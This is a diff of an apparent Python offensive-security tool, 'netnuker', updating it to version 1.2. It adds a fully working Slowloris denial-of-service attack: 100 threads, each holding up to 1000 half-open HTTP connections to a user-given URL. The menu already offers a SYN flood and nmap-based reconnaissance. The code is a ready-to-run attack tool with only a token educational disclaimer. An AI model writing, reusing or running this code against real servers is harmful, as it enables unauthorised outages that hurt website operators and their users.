@@ -10,6 +10,7 @@ import socket
 from datetime import datetime
 import random
 from scapy.all import *
+from urllib.parse import urlparse
 import subprocess  # Make sure to import subprocess for the ping function
 import time  # Import time module for sleep and duration
 
@@ -26,7 +27,7 @@ currentIP = get_current_ip()
 
 colorama.init(autoreset=True)
 
-intro = f"""{Fore.RED}
+intro = f"""{Fore.RED}{Style.BRIGHT}
  ███▄    █ ▓█████▄▄▄█████▓ ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
  ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒ ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
 ▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
@@ -35,10 +36,10 @@ intro = f"""{Fore.RED}
 ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░   ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
 ░ ░░   ░ ▒░ ░ ░  ░   ░    ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
    ░   ░ ░    ░    ░         ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
-         ░    ░  ░                 ░    ░     ░  ░      ░  ░   ░       
+         ░    ░  ░                 ░    ░     ░  ░      ░  ░   ░                                                                      
 {Fore.MAGENTA}
   /\      {Fore.MAGENTA}>>> {Fore.LIGHTCYAN_EX}made by mxnty{Fore.MAGENTA} <<<
- /  \\     {Fore.MAGENTA}>>> {Fore.LIGHTCYAN_EX}version: 1.1{Fore.MAGENTA} <<<
+ /  \\     {Fore.MAGENTA}>>> {Fore.LIGHTCYAN_EX}version: 1.2{Fore.MAGENTA} <<<
  |  |     {Fore.MAGENTA}>>> {Fore.LIGHTCYAN_EX}time of start: {datetime.now()}{Fore.MAGENTA} <<<
  |  |     {Fore.MAGENTA}>>> {Fore.LIGHTCYAN_EX}time awake: too long{Fore.MAGENTA} <<<
 / == \\    {Fore.MAGENTA}>>> {Fore.LIGHTCYAN_EX}hacked: all the things{Fore.MAGENTA} <<<
@@ -71,7 +72,7 @@ else:
 
 # Define options
 
-option = input(f"""{Fore.LIGHTYELLOW_EX}
+option = input(f"""{Fore.LIGHTYELLOW_EX}{Style.BRIGHT}
                
 **DISCLAIMER**
 This tool is intended for educational purposes only and should only be used on networks and systems for which you have explicit permission to conduct security testing. Unauthorized use of this tool is illegal and unethical, and can result in severe legal consequences.
@@ -81,21 +82,25 @@ Attacks:
  /                               |
 | 1. TCP Syn Flood Attack (DoS)   |
  \_______________________________/
-                
+  _________________________ __________
+ /                                    |
+| 2. Slowloris Attack (HTTP, Effective)|
+ \_____________________________________/    
+         
 {Fore.YELLOW}++++++++++++++++++++++++++++++++++
 {Fore.RED}
 Recon:
   __________________________________
  /                                  |
-| 2. Nmap Scan (-sC -sV -p- --open)  |
+| 3. Nmap Scan (-sC -sV -p- --open)  |
  \__________________________________/
   _______________________________________
  /                                       |
-| 3. subdestroyer Scan For Subdirectories |
+| 4. subdestroyer Scan For Subdirectories |
  \_______________________________________/
   _______________________________________
  /                                       |
-| 4. Nmap Scan For Most Popular UDP Ports |
+| 5. Nmap Scan For Most Popular UDP Ports |
  \_______________________________________/
 
 Your option: """)
@@ -125,9 +130,65 @@ if option == '1':
     syn_flood(target_ip, target_port, duration)
 
 elif option == '2':
+    target_url = input(f"{Fore.RED}Enter target URL (e.g., http://192.168.0.10): {Fore.RESET}")
+    duration = int(input(f"{Fore.RED}Enter duration in seconds: {Fore.RESET}"))
+
+    # Slowloris Attack
+    def slowloris_attack(target_url, duration):
+        if not target_url.startswith('http://') and not target_url.startswith('https://'):
+            target_url = 'http://' + target_url
+        parsed_url = urlparse(target_url)
+        target_host = parsed_url.hostname
+        target_port = 80 if parsed_url.port is None else parsed_url.port
+        
+        connections = []
+        timeout = time.time() + duration
+
+        while time.time() < timeout:
+            try:
+                while len(connections) < 1000:  # Increase the number of connections
+                    try:
+                        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        conn.settimeout(4)
+                        conn.connect((target_host, target_port))
+                        conn.send("GET / HTTP/1.1\r\n".encode('utf-8'))
+                        conn.send(f"Host: {target_host}\r\n".encode('utf-8'))
+                        conn.send("User-Agent: Mozilla/5.0\r\n".encode('utf-8'))
+                        conn.send("Content-Length: 42\r\n".encode('utf-8'))
+                        connections.append(conn)
+                        print(Fore.YELLOW + f"Slowloris connection established to {target_url}")
+                    except socket.error as e:
+                        print(Fore.RED + f"Error establishing connection: {e}")
+                
+                for conn in connections:
+                    try:
+                        conn.send("X-a: b\r\n".encode('utf-8'))
+                    except socket.error:
+                        connections.remove(conn)
+                
+                time.sleep(0.1)  # Reduce sleep time to increase frequency
+            except socket.timeout:
+                print(Fore.RED + f"Connection timed out, web server might be down!")
+            except socket.error as e:
+                print(Fore.RED + f"Error: {e}")
+
+    def start_slowloris_attack(target_url, duration):
+        threads = []
+        for _ in range(100):  # Increased number of threads for higher intensity
+            thread = Thread(target=slowloris_attack, args=(target_url, duration))
+            thread.start()
+            threads.append(thread)
+
+        for thread in threads:
+            thread.join()
+
+    print(f"{Fore.GREEN}Starting Slowloris attack on {target_url} for {duration} seconds{Fore.RESET}")
+    start_slowloris_attack(target_url, duration)
+
+elif option == '3':
     os.system(f"nmap -sC -sV -p- --open -v {target_ip}")
     sys.exit(1)
-elif option == '3':
+elif option == '4':
     banner = """
                 __        __          __                            
     _______  __/ /_  ____/ /__  _____/ /__________  __  _____  _____
@@ -238,7 +299,7 @@ elif option == '3':
     print(f"{Fore.YELLOW}[+] STATUS: Scan completed at {currentTime}")
 
     colorama.deinit()
-elif option == '4':
+elif option == '5':
     os.system(f"nmap -v -sU --top-ports 100 {target_ip}")
 else:
     print(f"{Fore.LIGHTRED_EX}[-] Invalid Option!")
